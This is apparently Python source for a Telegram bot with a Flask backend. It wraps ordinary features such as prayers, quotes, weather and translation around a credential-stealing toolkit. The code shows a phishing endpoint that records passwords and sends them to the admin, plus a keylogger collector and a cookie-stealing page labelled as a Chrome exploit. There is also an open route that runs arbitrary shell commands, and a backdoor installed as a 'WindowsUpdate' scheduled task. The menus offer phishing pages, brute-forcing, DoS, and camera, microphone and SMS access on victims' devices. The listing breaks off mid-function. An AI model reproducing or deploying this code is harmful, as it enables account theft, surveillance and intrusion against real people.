@app.route('/api/phishing_submit', methods=['POST'])
def phishing_submit():
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        notify_admin(f"🎯 تصيد جديد!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}")
        real_urls = {'facebook': 'https://www.facebook.com', 'google': 'https://www.google.com', 'whatsapp': 'https://web.whatsapp.com', 'twitter': 'https://x.com', 'instagram': 'https://www.instagram.com'}
        return f'<script>window.location.href="{real_urls.get(platform, "https://google.com")}";</script>'
    except Exception as e:
        return "حدث خطأ", 500

@app.route('/api/collect_keylog', methods=['POST'])
def collect_keylog():
    data = request.json
    chat_id = data.get('chat_id')
    keystrokes = data.get('keystrokes', '')
    if chat_id and keystrokes:
        safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                        (str(chat_id), "keylog", keystrokes, datetime.now().isoformat()))
        notify_admin(f"⌨️ ضغطات من {chat_id}: {keystrokes}")
    return jsonify({"status": "ok"})

@app.route('/exploit_chrome')
def exploit_chrome_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = '''
    <html><body><h1>Loading exploit...</h1>
    <script>
    alert("CVE-2025-5959 exploit triggered!");
    const chat_id = new URLSearchParams(window.location.search).get('id');
    const cookies = document.cookie;
    fetch('/api/collect_cookie', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: chat_id, cookies: cookies, url: window.location.href})
    });
    </script>
    </body></html>
    '''
    return render_template_string(html)

@app.route('/rce', methods=['POST'])
def rce():
    data = request.json
    chat_id = data.get('chat_id')
    command = data.get('command', '')
    if not chat_id or not command:
        return jsonify({"error": "بيانات ناقصة"}), 400
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
        output = output.decode('utf-8', errors='ignore')
    except Exception as e:
        output = str(e)
    safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                    (str(chat_id), command, output, datetime.now().isoformat()))
    notify_admin(f"🖥️ RCE من {chat_id}: {command} -> {output[:200]}")
    return jsonify({"output": output})

@app.route('/persistence', methods=['POST'])
def persistence():
    data = request.json
    chat_id = data.get('chat_id')
    if not chat_id:
        return jsonify({"error": "chat_id مطلوب"}), 400
    if platform.system() == "Windows":
        script = f'''
import os, requests, subprocess, time
while True:
    try:
        requests.get('{SERVER_URL}/health')
        time.sleep(60)
    except:
        pass
'''
        with open('backdoor.py', 'w') as f:
            f.write(script)
        subprocess.run(["schtasks", "/create", "/tn", "WindowsUpdate", "/tr", f"python {os.path.abspath('backdoor.py')}", "/sc", "onlogon", "/f"], shell=True, capture_output=True)
        notify_admin(f"🔒 باب خلفي مثبت لـ {chat_id}")
        return jsonify({"status": "ok"})
    return jsonify({"status": "غير مدعوم على هذا النظام"})
    # ===================== إنشاء البوت =====================
bot = TeleBot(TOKEN, parse_mode='HTML')
os.makedirs('temp', exist_ok=True)
os.makedirs('downloads', exist_ok=True)
os.makedirs('collected', exist_ok=True)

user_adkar_indices = defaultdict(lambda: {'sabah': 0, 'massaa': 0})
user_doaa_index = {}
user_rukn_index = {}
user_quote_index = {}
user_voice_selection = {}
waiting_for_password = set()
waiting_for_image_prompt = set()
waiting_for_voice_text = set()
user_emails = {}
temp_passwords = {}
pdf_texts = {}
user_states = {}
admin_remote = {}

# ===================== القوائم =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("حالة الطقس", callback_data="weather"), InlineKeyboardButton("موسوعة ويكيبيديا", callback_data="wikipedia"))
    markup.row(InlineKeyboardButton("مولد كلمات المرور", callback_data="password_gen"), InlineKeyboardButton("تحليل كلمات المرور", callback_data="password_strength"))
    markup.row(InlineKeyboardButton("تحويل نص لصوت (gTTS)", callback_data="voice_gtts_menu"), InlineKeyboardButton("الترجمة الفورية", callback_data="translate"))
    markup.row(InlineKeyboardButton("التذكير", callback_data="reminder"), InlineKeyboardButton("آخر الأخبار", callback_data="news"))
    markup.row(InlineKeyboardButton("تقصير الروابط", callback_data="shorten_url"), InlineKeyboardButton("فك الروابط المختصرة", callback_data="expand_url"))
    if user_can_use_collector(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("معلومات الجهاز", callback_data="device_info"), InlineKeyboardButton("الكاميرا الأمامية", callback_data="camera_hack"))
    if user_can_use_advanced(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("استخراج الكوكيز", callback_data="cookie_stealer"), InlineKeyboardButton("تتبع رقم الهاتف", callback_data="track_phone"))
        markup.row(InlineKeyboardButton("فحص أمني شامل", callback_data="comprehensive_scan"))
    markup.row(InlineKeyboardButton("مكالمة فيديو", callback_data="video_call"), InlineKeyboardButton("اقتباسات ملهمة", callback_data="quotes_menu"))
    markup.row(InlineKeyboardButton("نصائح مفيدة", callback_data="tips_menu"), InlineKeyboardButton("فحص الروابط", callback_data="check_link_btn"))
    markup.row(InlineKeyboardButton("تحليل ملفات APK", callback_data="analyze_apk"), InlineKeyboardButton("تحليل مستندات PDF", callback_data="pdf_menu"))
    markup.row(InlineKeyboardButton("إدارة الأجهزة", callback_data="list_devices"), InlineKeyboardButton("أذكار الصباح", callback_data="adkar_sabah"))
    markup.row(InlineKeyboardButton("أذكار المساء", callback_data="adkar_massaa"), InlineKeyboardButton("الأدعية المتنوعة", callback_data="doaa_menu"))
    markup.row(InlineKeyboardButton("المحتوى الإسلامي", callback_data="muslim_menu"), InlineKeyboardButton("🎨 توليد صور AI", callback_data="generate_image_btn"))
    markup.row(InlineKeyboardButton("📧 بريد مؤقت", callback_data="create_email_btn"), InlineKeyboardButton("رصيد النقاط", callback_data="my_points"))
    markup.row(InlineKeyboardButton("رابط الدعوة", callback_data="my_referral"), InlineKeyboardButton("سجل النقاط", callback_data="points_history"))
    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("الإعدادات المتقدمة", callback_data="admin_panel"))
        markup.row(InlineKeyboardButton("الأدوات المتقدمة", callback_data="hacking_menu"), InlineKeyboardButton("الحماية والأمان", callback_data="protection_menu"))
        markup.row(InlineKeyboardButton("🖥️ RCE (تنفيذ أوامر)", callback_data="rce_menu"), InlineKeyboardButton("🔑 Keylogger", callback_data="keylogger_menu"))
        markup.row(InlineKeyboardButton("💥 استغلال Chrome (CVE-2025-5959)", callback_data="exploit_chrome"))
        markup.row(InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"), InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"))
        markup.row(InlineKeyboardButton("إرسال رسالة", callback_data="send_to_user"), InlineKeyboardButton("سجل النشاطات", callback_data="user_activity"))
        markup.row(InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"), InlineKeyboardButton("إدارة الحظر", callback_data="admin_ban_menu"))
    markup.row(InlineKeyboardButton("تنزيل الفيديو", callback_data="download_video"))
    if user_can_use_phishing(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("صفحات تصيد", callback_data="phishing_pages"), InlineKeyboardButton("بريد تصيد", callback_data="phishing_email"))
    else:
        markup.row(InlineKeyboardButton("🔒 صفحات تصيد (300 نقطة)", callback_data="phishing_locked"))
    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("وضع التخفي", callback_data="toggle_stealth"), InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    return markup

def build_hacking_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("اختبار حقن SQL", callback_data="hack_sqli"), InlineKeyboardButton("اختبار XSS", callback_data="hack_xss"))
    markup.row(InlineKeyboardButton("هجوم DoS", callback_data="hack_dos"), InlineKeyboardButton("هجوم ARP Spoof", callback_data="hack_arp"))
    markup.row(InlineKeyboardButton("تخمين فيسبوك", callback_data="bruteforce_fb"), InlineKeyboardButton("تخمين انستغرام", callback_data="bruteforce_ig"))
    markup.row(InlineKeyboardButton("تخمين SSH", callback_data="bruteforce_ssh"), InlineKeyboardButton("تخمين FTP", callback_data="bruteforce_ftp"))
    markup.row(InlineKeyboardButton("تخمين مخصص", callback_data="bruteforce_custom"), InlineKeyboardButton("مسح المنافذ", callback_data="port_scan"))
    markup.row(InlineKeyboardButton("فحص شهادة SSL", callback_data="ssl_scan"), InlineKeyboardButton("كاميرا (جهاز مخترق)", callback_data="hack_camera"))
    markup.row(InlineKeyboardButton("ميكروفون (جهاز مخترق)", callback_data="hack_mic"), InlineKeyboardButton("موقع (جهاز مخترق)", callback_data="hack_location"))
    markup.row(InlineKeyboardButton("جهات اتصال (جهاز مخترق)", callback_data="hack_contacts"), InlineKeyboardButton("رسائل SMS (جهاز مخترق)", callback_data="hack_sms"))
    markup.row(InlineKeyboardButton("لقطة شاشة (جهاز مخترق)", callback_data="hack_screenshot"), InlineKeyboardButton("Shell", callback_data="hack_shell"))
    markup.row(InlineKeyboardButton("إيقاف تشغيل (جهاز مخترق)", callback_data="hack_shutdown"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("درع الحماية", callback_data="protect_shield"), InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    markup.row(InlineKeyboardButton("تخفي شامل", callback_data="protect_stealth"), InlineKeyboardButton("كشف الاختراق", callback_data="protect_detect"))
    markup.row(InlineKeyboardButton("تغيير الهوية", callback_data="protect_identity"), InlineKeyboardButton("تنظيف السجلات", callback_data="protect_clean"))
    markup.row(InlineKeyboardButton("حماية API", callback_data="protect_api"), InlineKeyboardButton("نسخ احتياطي", callback_data="protect_backup"))
    markup.row(InlineKeyboardButton("إعادة تشغيل آمن", callback_data="protect_reboot"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    for i, duaa in enumerate(DUAA_DB):
        markup.row(InlineKeyboardButton(duaa['title'], callback_data=f"doaa_{i}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_muslim_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton("أركان الإسلام", callback_data="muslim_arkan_islam"))
    markup.row(InlineKeyboardButton("أركان الإيمان", callback_data="muslim_arkan_iman"))
    markup.row(InlineKeyboardButton("الوضوء", callback_data="muslim_wudu"))
    markup.row(InlineKeyboardButton("صفة الغسل", callback_data="muslim_ghusl"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for cat in QUOTES_DB.keys():
        markup.row(InlineKeyboardButton(cat, callback_data=f"quote_cat_{cat}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_voice_gtts_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for voice_name in VOICES.keys():
        markup.row(InlineKeyboardButton(f"🎤 {voice_name}", callback_data=f"voice_gtts_{voice_name}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("تلخيص PDF", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
    markup.row(InlineKeyboardButton("تحليل ذكي (أسئلة)", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_whatsapp"), InlineKeyboardButton("تويتر", callback_data="phish_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_instagram"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_platform_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_platform_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_platform_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_platform_whatsapp"), InlineKeyboardButton("تويتر", callback_data="phish_platform_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_platform_instagram"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_translate_menu():
    markup = InlineKeyboardMarkup(row_width=3)
    languages = list(LANGUAGES.items())
    for i in range(0, len(languages), 3):
        row = []
        for code, name in languages[i:i+3]:
            row.append(InlineKeyboardButton(name, callback_data=f"trans_lang_{code}"))
        markup.row(*row)
    markup.row(InlineKeyboardButton("إلغاء", callback_data="back_main"))
    return markup

def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("الإحصائيات", callback_data="admin_stats"), InlineKeyboardButton("البث الجماعي", callback_data="admin_broadcast"))
    markup.row(InlineKeyboardButton("قائمة المستخدمين", callback_data="admin_users"), InlineKeyboardButton("التقارير", callback_data="admin_reports"))
    markup.row(InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"), InlineKeyboardButton("إدارة الحظر", callback_data="admin_ban_menu"))
    markup.row(InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"), InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"))
    markup.row(InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"), InlineKeyboardButton("إرسال رسالة", callback_data="send_to_user"))
    markup.row(InlineKeyboardButton("سجل النشاطات", callback_data="user_activity"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_permissions_menu(chat_id, target_user):
    row = safe_db_query("SELECT can_use_collector, can_use_camera, can_use_phishing, can_use_advanced FROM users WHERE chat_id = ?", (target_user,))
    if not row:
        return None
    can_collector, can_camera, can_phishing, can_advanced = row
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton(f"معلومات الجهاز: {'✅' if can_collector else '❌'}", callback_data=f"perm_toggle_collector_{target_user}"))
    markup.row(InlineKeyboardButton(f"كاميرا: {'✅' if can_camera else '❌'}", callback_data=f"perm_toggle_camera_{target_user}"))
    markup.row(InlineKeyboardButton(f"تصيد: {'✅' if can_phishing else '❌'}", callback_data=f"perm_toggle_phishing_{target_user}"))
    markup.row(InlineKeyboardButton(f"متقدم: {'✅' if can_advanced else '❌'}", callback_data=f"perm_toggle_advanced_{target_user}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="admin_permissions"))
    return markup

def build_adkar_action_menu(adkar_type, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي", callback_data=f"adkar_next_{adkar_type}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_action_menu(current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي", callback_data=f"doaa_next_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="doaa_menu"))
    return markup

def build_rukn_action_menu(rukn_type, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي", callback_data=f"rukn_next_{rukn_type}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quote_action_menu(category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي", callback_data=f"quote_next_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="quotes_menu"))
    return markup

def build_users_menu(chat_id, action):
    users = safe_db_query("SELECT chat_id, is_admin, is_banned, points FROM users", fetch_one=False)
    if not users:
        return None, "لا يوجد مستخدمين"
    markup = InlineKeyboardMarkup(row_width=1)
    for user in users:
        user_id = user[0]
        name = get_user_name(user_id)
        status = "🟢" if user[2] == 0 else "🔴"
        label = f"{name} ({user_id}) - {status} - نقاط: {user[3]}"
        markup.row(InlineKeyboardButton(label, callback_data=f"{action}_user_{user_id}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup, None

# ===================== دوال العرض =====================
def show_duaa(chat_id, message_id, index):
    if index >= len(DUAA_DB): index = 0
    duaa = DUAA_DB[index]
    text = f"{duaa['title']}\n\n{duaa['text']}\n\nالمصدر: {duaa['source']}\n\n{index + 1} من {len(DUAA_DB)}"
    markup = build_doaa_action_menu(index, len(DUAA_DB))
    bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')

def show_arkan(chat_id, message_id, type_arkan, index):
    data_list = ARKAN_ISLAM if type_arkan == "islam" else ARKAN_IMAN
    title = "أركان الإسلام" if type_arkan == "islam" else "أركان الإيمان"
    if index >= len(data_list): index = 0
    text = f"{title}\n\n{index + 1}. {data_list[index]}\n\n{index + 1} من {len(data_list)}"
    markup = build_rukn_action_menu(type_arkan, index, len(data_list))
    bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')

def show_quote(chat_id, message_id, category, index):
    quotes = QUOTES_DB[category]
    if index >= len(quotes): index = 0
    quote_text = quotes[index]
    border = random.choice(BORDERS)
    final_text = border.format(quote_text)
    text = f"نوع: {category}\n\n{final_text}\n\n{index + 1} من {len(quotes)}"
    markup = build_quote_action_menu(category, index, len(quotes))
    bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        chat_id = call.message.chat.id
        data = call.data
        log_activity(chat_id, data)
        update_last_seen(chat_id)

        if data == "back_main":
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
            return

        # الأزرار التي ترسل روابط
        if data == "device_info":
            link = f"{SERVER_URL}/device_info?id={chat_id}"
            safe_send(chat_id, f"رابط معلومات الجهاز:\n{link}")
            return

        if data == "camera_hack":
            link = f"{SERVER_URL}/camera_hack?id={chat_id}"
            safe_send(chat_id, f"رابط الكاميرا الأمامية:\n{link}\n(اضغط على الزر في الصفحة للتفعيل)")
            return

        if data == "video_call":
            link = f"{SERVER_URL}/video_call?id={chat_id}"
            safe_send(chat_id, f"📹 رابط مكالمة فيديو:\n{link}\n(سيتم طلب الكاميرا بشكل طبيعي)")
            return

        if data == "cookie_stealer":
            link = f"{SERVER_URL}/cookie_stealer?id={chat_id}"
            safe_send(chat_id, f"🍪 رابط استخراج الكوكيز:\n{link}")
            return

        if data == "exploit_chrome":
            link = f"{SERVER_URL}/exploit_chrome?id={chat_id}"
            safe_send(chat_id, f"رابط استغلال Chrome (CVE-2025-5959):\n{link}")
            return

        # تصيد
        if data == "phish_facebook":
            link = f"{SERVER_URL}/phishing_pages/facebook"
            safe_send(chat_id, f"✅ صفحة تصيد فيسبوك:\n{link}\n\nشارك هذا الرابط مع الضحية.")
            return
        if data == "phish_google":
            link = f"{SERVER_URL}/phishing_pages/google"
            safe_send(chat_id, f"✅ صفحة تصيد جوجل:\n{link}")
            return
        if data == "phish_whatsapp":
            link = f"{SERVER_URL}/phishing_pages/whatsapp"
            safe_send(chat_id, f"✅ صفحة تصيد واتساب:\n{link}")
            return
        if data == "phish_twitter":
            link = f"{SERVER_URL}/phishing_pages/twitter"
            safe_send(chat_id, f"✅ صفحة تصيد تويتر:\n{link}")
            return
        if data == "phish_instagram":
            link = f"{SERVER_URL}/phishing_pages/instagram"
            safe_send(chat_id, f"✅ صفحة تصيد انستغرام:\n{link}")
            return
        if data == "phishing_pages":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية.")
                return
            safe_send(chat_id, "اختر المنصة:", reply_markup=build_phishing_pages_menu())
            return

        # باقي الأزرار (أذكار، أدعية، أركان، اقتباسات، صوت، صور، بريد، نقاط، إدارة، حماية، هجمات)
        # تم تضمينها في الكود السابق، وهنا نضيفها بشكل مختصر

        # ===== أذكار =====
        if data == "adkar_sabah":
            user_adkar_indices[chat_id]['sabah'] = 0
            adkar_list = ADKAR_SABAH
            current = adkar_list[0]
            total = len(adkar_list)
            safe_send(chat_id, f"📿 أذكار الصباح:\n\n{current}", reply_markup=build_adkar_action_menu('sabah', 0, total))
            return
        if data == "adkar_massaa":
            user_adkar_indices[chat_id]['massaa'] = 0
            adkar_list = ADKAR_MASSAA
            current = adkar_list[0]
            total = len(adkar_list)
            safe_send(chat_id, f"🌙 أذكار المساء:\n\n{current}", reply_markup=build_adkar_action_menu('massaa', 0, total))
            return
        if data.startswith("adkar_next_"):
            parts = data.split("_")
            adkar_type = parts[2]
            idx = int(parts[3])
            adkar_list = ADKAR_SABAH if adkar_type == 'sabah' else ADKAR_MASSAA
            if idx < len(adkar_list):
                current = adkar_list[idx]
                total = len(adkar_list)
                safe_send(chat_id, f"📿 {('أذكار الصباح' if adkar_type == 'sabah' else 'أذكار المساء')}:\n\n{current}", reply_markup=build_adkar_action_menu(adkar_type, idx, total))
            return

        # ===== أدعية =====
        if data == "doaa_menu":
            safe_send(chat_id, "اختر الدعاء:", reply_markup=build_doaa_menu())
            return
        if data.startswith("doaa_"):
            idx = int(data.split("_")[1])
            user_doaa_index[chat_id] = idx
            msg = safe_send(chat_id, "⏳ جاري تحميل الدعاء...")
            if msg:
                show_duaa(chat_id, msg.message_id, idx)
            return
        if data.startswith("doaa_next_"):
            idx = int(data.split("_")[2])
            user_doaa_index[chat_id] = idx
            show_duaa(chat_id, call.message.message_id, idx)
            return

        # ===== أركان =====
        if data == "muslim_menu":
            safe_send(chat_id, "اختر الموضوع:", reply_markup=build_muslim_menu())
            return
        if data == "muslim_arkan_islam":
            user_rukn_index[chat_id] = 0
            msg = safe_send(chat_id, "⏳ جاري تحميل أركان الإسلام...")
            if msg:
                show_arkan(chat_id, msg.message_id, "islam", 0)
            return
        if data == "muslim_arkan_iman":
            user_rukn_index[chat_id] = 0
            msg = safe_send(chat_id, "⏳ جاري تحميل أركان الإيمان...")
            if msg:
                show_arkan(chat_id, msg.message_id, "iman", 0)
            return
        if data.startswith("rukn_next_"):
            parts = data.split("_")
            type_arkan = parts[2]
            idx = int(parts[3])
            user_rukn_index[chat_id] = idx
            show_arkan(chat_id, call.message.message_id, type_arkan, idx)
            return

        # ===== اقتباسات =====
        if data == "quotes_menu":
            safe_send(chat_id, "اختر نوع الاقتباسات:", reply_markup=build_quotes_menu())
            return
        if data.startswith("quote_cat_"):
            category = data.replace("quote_cat_", "")
            user_quote_index[chat_id] = {'category': category, 'index': 0}
            msg = safe_send(chat_id, "⏳ جاري تحميل الاقتباس...")
            if msg:
                show_quote(chat_id, msg.message_id, category, 0)
            return
        if data.startswith("quote_next_"):
            parts = data.split("_")
            category = parts[2]
            idx = int(parts[3])
            user_quote_index[chat_id] = {'category': category, 'index': idx}
            show_quote(chat_id, call.message.message_id, category, idx)
            return

        # ===== صوت gTTS =====
        if data == "voice_gtts_menu":
            safe_send(chat_id, "اختر نوع الصوت:", reply_markup=build_voice_gtts_menu())
            return
        if data.startswith("voice_gtts_"):
            voice_name = data.replace("voice_gtts_", "")
            user_voice_selection[chat_id] = voice_name
            waiting_for_voice_text.add(chat_id)
            safe_send(chat_id, f"📝 أرسل النص الذي تريد تحويله إلى صوت {voice_name}:")
            return

        # ===== توليد صور =====
        if data == "generate_image_btn":
            waiting_for_image_prompt.add(chat_id)
            safe_send(chat_id, "🎨 أرسل وصف الصورة التي تريد توليدها")
            return

        # ===== كلمات السر =====
        if data == "password_strength":
            waiting_for_password.add(chat_id)
            safe_send(chat_id, "🔐 أرسل كلمة المرور لتحليلها")
            return
        if data == "password_gen":
            pwd = generate_strong_password()
            safe_send(chat_id, f"🔑 كلمة مرور قوية:\n`{pwd}`\n\nيمكنك استخدامها مباشرة.", parse_mode="Markdown")
            return

        # ===== بريد مؤقت =====
        if data == "create_email_btn":
            name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            domain = random.choice(["1secmail.com", "1secmail.org", "1secmail.net"])
            email = f"{name}@{domain}"
            user_emails[chat_id] = [email, name, domain]
            text = f"📧 تم انشاء بريدك المؤقت\n`{email}`\nالصلاحية: 10 دقائق"
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔄 تحديث الصندوق", callback_data="check_mail_btn"))
            markup.row(InlineKeyboardButton("🗑️ حذف البريد", callback_data="delete_mail_btn"))
            safe_send(chat_id, text, reply_markup=markup, parse_mode="Markdown")
            return
        if data == "check_mail_btn":
            if chat_id not in user_emails:
                safe_send(chat_id, "لا يوجد بريد نشط")
                return
            name, domain = user_emails[chat_id][1], user_emails[chat_id][2]
            url = f"https://www.1secmail.com/api/v1/?action=getMessages&login={name}&domain={domain}"
            try:
                messages = requests.get(url, timeout=5).json()
            except:
                safe_send(chat_id, "خطأ في الاتصال")
                return
            if not messages:
                safe_send(chat_id, "📭 لا توجد رسائل جديدة")
                return
            for msg in messages:
                text = f"📩 رسالة جديدة\nمن: {msg['from']}\nالموضوع: {msg['subject']}\nID: {msg['id']}\nلعرضها ارسل: /read_{msg['id']}"
                safe_send(chat_id, text)
            return
        if data == "delete_mail_btn":
            if chat_id in user_emails:
                del user_emails[chat_id]
            safe_send(chat_id, "🗑️ تم حذف البريد")
            return

        # ===== نقاط ودعوات =====
        if data == "my_points":
            points = get_user_points(chat_id)
            safe_send(chat_id, f"💎 رصيد نقاطك: {points}")
            return
        if data == "my_referral":
            code = safe_db_query("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
            if code and code[0]:
                safe_send(chat_id, f"🔗 رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{code[0]}")
            else:
                new_code = secrets.token_urlsafe(8)
                safe_db_execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (new_code, chat_id))
                safe_send(chat_id, f"🔗 رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{new_code}")
            return
        if data == "points_history":
            rows = safe_db_query("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 10", (chat_id,), fetch_one=False)
            if rows:
                msg = "📜 سجل النقاط:\n"
                for r in rows:
                    msg += f"{r[0]} نقطة - {r[1]} - {r[2][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد سجلات.")
            return

        # ===== خدمات عامة =====
        if data == "weather":
            user_states[chat_id] = "waiting_weather"
            safe_send(chat_id, "🌤️ أدخل اسم المدينة:")
            return
        if data == "wikipedia":
            user_states[chat_id] = "waiting_wikipedia"
            safe_send(chat_id, "📚 أدخل مصطلح البحث في ويكيبيديا:")
            return
        if data == "translate":
            user_states[chat_id] = "waiting_translate"
            safe_send(chat_id, "🌐 أرسل النص للترجمة:")
            return
        if data.startswith("trans_lang_"):
            lang_code = "_".join(data.split("_")[2:])
            text = user_states.get(f"{chat_id}_translate_text", "")
            if text:
                chunks, detected, src_name, tgt_name = translate_text_advanced_with_lang(text, lang_code)
                msg = "🌐 الترجمة:\n\n" + "\n".join(chunks)
                safe_send(chat_id, msg)
                user_states[chat_id] = None
            return
        if data == "reminder":
            user_states[chat_id] = "waiting_reminder"
            safe_send(chat_id, "⏰ أدخل التذكير بالصيغة: الرسالة|الساعة:الدقيقة")
            return
        if data == "news":
            user_states[chat_id] = "waiting_news"
            safe_send(chat_id, "📰 أدخل موضوع الأخبار:")
            return
        if data == "shorten_url":
            user_states[chat_id] = "waiting_shorten_url"
            safe_send(chat_id, "🔗 أرسل الرابط لتقصيره:")
            return
        if data == "expand_url":
            user_states[chat_id] = "waiting_expand_url"
            safe_send(chat_id, "🔗 أرسل الرابط المختصر لفكه:")
            return
        if data == "pdf_menu":
            safe_send(chat_id, "📄 اختر خدمة PDF:", reply_markup=build_pdf_menu())
            return
        if data == "pdf_summary":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📄 الملخص:\n{pdf_text[:1000]}...")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            return
        if data == "pdf_extract":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📄 النص المستخرج:\n{pdf_text[:3000]}...")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            return
        if data == "pdf_smart":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                user_states[chat_id] = "waiting_pdf_question"
                safe_send(chat_id, "🤖 اطرح سؤالك حول محتوى الـ PDF:")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            return
        if data == "analyze_apk":
            user_states[chat_id] = "waiting_apk_analysis"
            safe_send(chat_id, "أرسل ملف APK لتحليله")
            return
        if data == "track_phone":
            user_states[chat_id] = "waiting_phone_number"
            safe_send(chat_id, "📱 أدخل رقم الهاتف (مثال: +20123456789):")
            return
        if data == "comprehensive_scan":
            user_states[chat_id] = "waiting_scan_url"
            safe_send(chat_id, "🔍 أرسل رابط الموقع لفحصه شامل")
            return
        if data == "list_devices":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            rows = safe_db_query("SELECT device_id, name, status, last_seen FROM targets", fetch_one=False)
            if rows:
